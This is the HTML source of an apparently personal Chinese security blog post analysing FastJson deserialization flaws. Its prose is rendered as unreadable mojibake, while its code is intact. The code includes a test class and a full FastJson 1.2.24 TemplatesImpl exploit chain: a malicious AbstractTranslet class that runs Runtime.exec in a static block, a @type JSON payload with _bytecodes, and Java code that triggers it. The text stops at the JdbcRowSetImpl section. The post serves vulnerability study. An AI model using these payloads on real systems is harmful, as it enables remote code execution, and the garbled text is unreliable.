<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“ | Reus09&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“" />
<meta property="og:description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-12T14:04:36+08:00" />
<meta property="article:modified_time" content="2022-10-12T14:04:36+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“"/>
<meta name="twitter:description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
      "item": "http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
  "name": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
  "description": "å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™",
  "keywords": [
    ""
  ],
  "articleBody": "å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜ä¹Ÿå­˜åœ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥æ¶æ„JSONå®ç°ååºåˆ—æ¼æ´ï¼Œå¦ä¸€æ–¹é¢ç”±äºFastJson1.2.25ä¹‹åéƒ½æ˜¯å¯¹AutoTypeæœºåˆ¶è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥ä¹Ÿç®€å•å­¦ä¹ äº†AutoTypeCheckæœºåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›æœŸæœ›ç±»çš„Gadgetã€‚æœ¬æ–‡ä¸»è¦å¯¹FastJsonå¸¸ç”¨çš„çš„è§£æStringçš„parse,parseObjectç­‰æ–¹æ³•è¿›è¡Œåˆ†æï¼Œç„¶ååˆ†æAutoTypeCheckæœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯¹FastJsonå†å²æ¼æ´è¿›è¡Œç®€å•çš„æ•´ç†ã€‚\næ¼æ´ä»‹ç» è¿™é‡Œå°±å†ä»‹ç»ä¸€ä¸‹FastJsonçš„èƒŒæ™¯ã€‚\nfastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚\nç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚\nè¿™é‡Œæ”¾ä¸€ä¸‹æ¡†æ¶å›¾\nä¸»è¦åŠŸèƒ½åœ¨DefaultJSONParserç±»ä¸­å®ç°çš„ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ä¼šåº”ç”¨å…¶ä»–çš„ä¸€äº›å¤–éƒ¨ç±»æ¥å®Œæˆåç»­æ“ä½œã€‚ParserConfigä¸»è¦æ˜¯è¿›è¡Œé…ç½®ä¿¡æ¯çš„åˆå§‹åŒ–ï¼ŒJSONLexerä¸»è¦æ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†å¹¶åˆ†æï¼Œååºåˆ—åŒ–åœ¨JavaBeanDeserializerä¸­å¤„ç†ã€‚\nååºåˆ—åŒ–æ–¹æ³• å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸ºparse()ã€parseObject()ã€parseArray()ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•ä¹Ÿå‡åŒ…å«è‹¥å¹²é‡è½½æ–¹æ³•ï¼Œå¸¦æœ‰ä¸åŒå‚æ•°ï¼š\nååºåˆ—åŒ–ç‰¹æ€§ï¼šcom.alibaba.fastjson.parser.Featureï¼Œ ç±»çš„ç±»å‹ï¼šjava.lang.reflect.Typeï¼Œç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–ç±»çš„ç±»å‹ã€‚ å¤„ç†æ³›å‹ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.TypeReferenceã€‚ ç¼–ç¨‹æ‰©å±•å®šåˆ¶ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.parser.deserializer.ParseProcessï¼Œä¾‹å¦‚ExtraProcessor ç”¨äºå¤„ç†å¤šä½™çš„å­—æ®µï¼ŒExtraTypeProvider ç”¨äºå¤„ç†å¤šä½™å­—æ®µæ—¶æä¾›ç±»å‹ä¿¡æ¯ã€‚ è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson åŠŸèƒ½è¦ç‚¹ï¼š\nä½¿ç”¨ JSON.parse(jsonString) å’Œ JSON.parseObject(jsonString, Target.class)ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– @type æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚ fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ get å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª Collection|Map|AtomicBoolean|AtomicInteger|AtomicLongã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ set å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ com.alibaba.fastjson.util.JavaBeanInfo.build() ä¸­ã€‚ ä½¿ç”¨ JSON.parseObject(jsonString) å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚ å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ Feature.SupportNonPublicField å‚æ•°ã€‚ fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() æ–¹æ³•ï¼Œä¼šå¿½ç•¥ _|- å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« _a_g_e_ï¼Œgetter æ–¹æ³•ä¸º getAge()ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ _ å’Œ - è¿›è¡Œç»„åˆæ··æ·†ã€‚ fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º byte[]ï¼Œå°†ä¼šè°ƒç”¨com.alibaba.fastjson.parser.JSONScanner#bytesValue è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚ ä¸ºäº†æµ‹è¯•ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 package com.reus09; import com.alibaba.fastjson.JSON; import java.io.UnsupportedEncodingException; import java.util.Arrays; import java.util.Properties; import java.util.Base64; /** * @ClassName FastJsonTest * @Description TODO * @Author reus09 * @Date 2022/10/11 19:34 * @Version 1.0 **/ public class FastJsonTest { public String t1; private Integer t2; private Boolean t3; private Properties t4; private Properties t5; private byte[] t6; @Override public String toString() { return \"FastJsonTest{\" + \"t1='\" + t1 + '\\'' + \", t2=\" + t2 + \", t3=\" + t3 + \", t4=\" + t4 + \", t5=\" + t5 + \", t6=\" + Arrays.toString(t6) + '}'; } public byte[] getT6() { return t6; } public void setT6(byte[] t6) { this.t6 = t6; } public FastJsonTest() { System.out.println(\"FastJsonTest() is called \"); } public void setT5(Properties t5) { System.out.println(\"setT5()\"); this.t5 = t5; } public void setT1(String t1) { System.out.println(\"setT1()\"); this.t1 = t1; } public void setT2(Integer t2) { System.out.println(\"setT2()\"); this.t2 = t2; } public String getT1() { System.out.println(\"getT1()\"); return t1; } public Integer getT2() { System.out.println(\"getT2()\"); return t2; } public Boolean getT3() { System.out.println(\"getT3()\"); return t3; } public Properties getT4() { System.out.println(\"getT4()\"); return t4; } public Properties getT5() { System.out.println(\"getT5()\"); return t5; } public static void main(String[] args) throws UnsupportedEncodingException { String jsonString = \"{\\\"@type\\\":\\\"com.reus09.FastJsonTest\\\",\\\"t1\\\":\\\"t1\\\",\\\"t2\\\":1,\\\"t3\\\":1,\\\"t4\\\":{},\\\"t5\\\":{},\\\"t6\\\":\\\"\"+Base64.getEncoder().encodeToString(\"Hello,FastJson\".getBytes(\"utf-8\"))+\"\\\"}\"; System.out.println(\"---------JSON.parse(string)-----------\"); Object obj = JSON.parse(jsonString); System.out.println(obj); System.out.println(\"---------JSON.parseObject(string,clazz)-----------\"); Object obj1 = JSON.parseObject(jsonString,FastJsonTest.class); System.out.println(obj1); System.out.println(\"---------JSON.parseObject(string)-----------\"); Object obj2 = JSON.parseObject(jsonString); System.out.println(obj2); } } è¿è¡Œç»“æœï¼š\næ€»çš„æ¥è¯´ï¼Œparse(string),parseObject(string,clazzs)ä¸parseObject(string)è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œparse(string) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•ï¼Œè€Œ parseObject(string) ç”±äºè¦å°†è¿”å›å€¼è½¬åŒ–ä¸ºJSONObjectï¼Œå¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„getter æ–¹æ³•æ¥å°†å‚æ•°èµ‹å€¼ç»™JSONObjectï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒparseObject(string)çš„å±å®³æ€§ç›¸å¯¹ä¼šæ›´å¤§ã€‚\nFastJson 1.2.24åˆ†æ FastJson1.2.24å¼€å¯äº†FastJsonååºåˆ—å®ç°RCEçš„å¤§é—¨\nfastjson é»˜è®¤ä½¿ç”¨ @type æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚\nè¿™é‡Œå¯¹1.2.24çš„ä¸¤æ¡å¸¸è§åˆ©ç”¨é“¾TemplatesImpl ååºåˆ—åŒ–å’ŒJdbcRowSetImpl ååºåˆ—åŒ–è¿›è¡Œç®€å•çš„å­¦ä¹ ã€‚\nTemplatesImpl ååºåˆ—åŒ– åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾çš„å…¨è¿‡ç¨‹ï¼Œå®é™…ä¸Šåœ¨æŸ¥é˜…èµ„æ–™çš„åŒæ—¶ï¼Œå‘ç°å…¶ä¹Ÿæ˜¯CommonsCollections-3é“¾å­çš„åˆ†æï¼Œå› ä¸ºåˆšåˆšæ¥è§¦åˆ°Javaå®‰å…¨,å¯¹CC3é“¾åªæ˜¯ç•¥æœ‰è€³é—»ï¼Œä¹‹åçš„å­¦ä¹ ä¹‹ä¸­ä¼šæ…¢æ…¢å­¦ä¹ CCé“¾çš„å„ç§åˆ©ç”¨å§¿åŠ¿ã€‚\nå‚è€ƒçš„å„ä½å¤§å¸ˆå‚…çš„åšå®¢å…³äºTemplateImplååºåˆ—åŒ–é“¾çš„æ€è€ƒéƒ½æ˜¯ä»æ¼æ´æŒ–æ˜çš„æ€è·¯å¼€å§‹ï¼Œä»getTransletInstance()è¿™ä¸ªå®ä¾‹åŒ–ç‚¹å‡ºå‘ï¼Œéœ€è¦å“ªä¸€ä¸ªåˆ©ç”¨å…ƒç´ å°±å»å¯»æ‰¾ï¼Œæœ€åå®Œå–„åˆ©ç”¨è¿‡ç¨‹ã€‚\nå‡½æ•°æ ˆè°ƒç”¨æƒ…å†µ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 exec:348, Runtime (java.lang) :22, Calculartor (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:193, JSON (com.alibaba.fastjson) main:117, FastJsonTest (com.reus09) é¦–å…ˆæˆ‘ä»¬åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstanceå­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ _classï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º_transletIndex çš„ç±»ä¼šåœ¨ getTransletInstance() æ–¹æ³•ä¸­ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚\nåŒæ—¶æˆ‘ä»¬å‘ç°com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformerä¸­è°ƒç”¨äº†getTransletInstance()\næ–¹æ³•,åŒæ—¶,com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputPropertiesè°ƒç”¨äº†è¿™é‡Œçš„newTransformer()æ–¹æ³•ã€‚ è¿™é‡Œçš„getOutputProperties()æ–¹æ³•å°±æ˜¯å¯¹TemplatesImplç±»çš„ç§æœ‰å…ƒç´ outputPropertiesçš„getteræ–¹æ³•\né‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶_classä»¥åŠ_transletIndexå°±å¯ä»¥å®ç°ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œä»è€Œè§¦å‘æ¼æ´ã€‚\ndefineTransletClasses()ä¸newInstance()åœ¨åŒä¸€æ–¹æ³•å†…ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹``defineTransletClasses()` çš„é€»è¾‘ã€‚\nå…ˆè¦æ±‚ _bytecodes ä¸ä¸ºç©ºï¼Œæ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ ClassLoader å»åŠ è½½ _bytecodes ä¸­çš„ byte[] ã€‚è€Œ _bytecodes ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚\n_bytecodeså˜é‡éç©ºå€¼æ—¶ï¼Œç¨‹åºå°†ä¼šæŠŠ_bytecodesæ•°ç»„ä¸­çš„å€¼å¾ªç¯å–å‡ºï¼Œä½¿ç”¨loader.defineClassæ–¹æ³•ä»å­—èŠ‚ç è½¬åŒ–ä¸ºClasså¯¹è±¡ï¼Œéšååèµ‹å€¼ç»™_class[i]ã€‚\nè€Œå¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º ABSTRACT_TRANSLET ä¹Ÿå°±æ˜¯com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ_transletIndex è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯_class[0]ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\né‚£è¿™æ ·ä¸€æ¡å®Œæ•´çš„æ¼æ´è°ƒç”¨é“¾å°±å‘ˆç°å‡ºæ¥äº†ï¼š\næ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ _bytecodes æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• getOutputProperties()ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼šgetOutputProperties() -\u003e newTransformer() -\u003e getTransletInstance() -\u003e defineTransletClasses() / EvilClass.newInstance(). åŒæ—¶ä¸ºäº†ç¨‹åºåœ¨å®ä¾‹åŒ–ä¹‹å‰å› æŠ¥é”™é€€å‡ºï¼Œéœ€è¦å°†_nameå’Œ_tfactoryè®¾ç½®ä¸ä¸ºç©ºï¼Œ_tfactoryå¦‚æœä¸æŒ‡å®šä¼šå‡ºç°ç©ºæŒ‡é’ˆã€‚æŸ¥çœ‹_tfactoryçš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 private transient TransformerFactoryImpl _tfactory = null; å…·ä½“å®ç°ï¼š\nä¸€ä¸ªç»§æ‰¿äº†AbstractTransletçš„æ¶æ„ç±»,å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.reus09; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calculartor * @Description TODO * @Author reus09 * @Date 2022/10/12 15:42 * @Version 1.0 **/ public class Calculartor extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } payloadéƒ¨åˆ†ï¼š\nJSONå¯¹åº”çš„å¦‚ä¸‹:\n1 2 3 4 5 6 7 { \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } ä»£ç å¦‚ä¸‹:\n1 2 3 4 byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class\")); String codeString = Base64.getEncoder().encodeToString(code); String payload = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\\\"_bytecodes\\\":[\\\"\"+Base64.getEncoder().encodeToString(code)+\"\\\"],\\\"_name\\\":\\\"reus09\\\",\\\"_tfactory\\\":{ },\\\"_outputProperties\\\":{ },\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\"; JSON.parse(payload, Feature.SupportNonPublicField); JdbcRowSetImpl ååºåˆ—åŒ– 